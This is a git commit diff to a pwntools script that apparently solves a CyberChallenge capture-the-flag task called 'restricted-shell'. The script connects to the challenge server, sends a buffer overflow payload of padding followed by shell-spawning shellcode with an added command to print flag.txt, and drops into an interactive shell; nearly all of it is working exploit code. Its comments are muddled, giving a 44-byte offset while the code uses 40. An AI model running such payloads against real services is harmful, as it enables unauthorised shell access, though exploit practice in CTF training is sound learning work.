b2ba154c12b0bfde4e5911502ccb7b88ca149f86
MassimiIiano <massimiliano.mola.bzs@gmail.com>
2024-03-11 18:14:07 +0100

    banana

--- software-security/sw-2/restricted-shell/test.py
+++ software-security/sw-2/restricted-shell/test.py
@@ -1,20 +1,28 @@
 from pwn import *
 
 # Create a process for the vulnerable program
-exe = ELF('restricted_shell')
+# exe = ELF('restricted_shell')cat 
+
+context.log_level = 'debug'
 p = remote('shell.challs.cyberchallenge.it', 9123)
 
 # Shellcode that opens a shell
-shellcode = asm(shellcraft.sh())
+shellcode = asm(shellcraft.sh() + shellcraft.cat('flag.txt'))
 
 # Create the payload
 # 'A' * 44 is to fill the buffer and overwrite the saved EBP
 # shellcode is the new return address, replace it with the address of your shellcode
-payload = b'A' * 100 + shellcode
+payload = b'A' * 40 + shellcode
 
 # Send the payload
 p.sendline(payload)
 
+
+
+p.clean()
+
+
 # Interact with the process
 p.interactive()
+
 p.close()
